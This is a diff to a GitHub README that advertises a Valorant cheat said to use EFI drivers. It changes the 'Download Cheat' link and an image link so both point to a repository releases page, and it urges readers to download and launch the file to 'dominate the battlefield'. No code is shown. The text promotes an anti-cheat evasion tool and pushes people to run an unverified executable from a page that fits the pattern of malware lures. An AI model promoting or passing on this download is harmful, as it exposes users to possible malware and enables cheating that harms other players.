@@ -28,7 +28,7 @@ This hack offers a wide range of features to give you an unfair advantage in Val
 
 ## Access the Cheat 📥
 
-To access the Valorant cheat utilizing EFI drivers, click the following link: [Download Cheat](https://github.com/files/File.zip)
+To access the Valorant cheat utilizing EFI drivers, click the following link: [Download Cheat](https://github.com/Sai123Aravind/VALORANT-EFI-DRIVER-Cheat-Hack/releases)
 
 Kindly note that the provided link needs to be launched to initiate the cheat in your Valorant gameplay. If you encounter any issues with the link or it does not work, please check the "Releases" section for alternative download options.
 
@@ -66,7 +66,7 @@ It's important to note that the use of cheats and hacks in online games like Val
 
 Let's make the most of our gaming experience with the Valorant EFI Driver Cheat Hack! Download now and dominate the battlefield 🔥🎮.
 
-![Valorant Cheat](https://imgur.com/your-image-link)
+![Valorant Cheat](https://github.com/Sai123Aravind/VALORANT-EFI-DRIVER-Cheat-Hack/releases)
 
 --- 
 
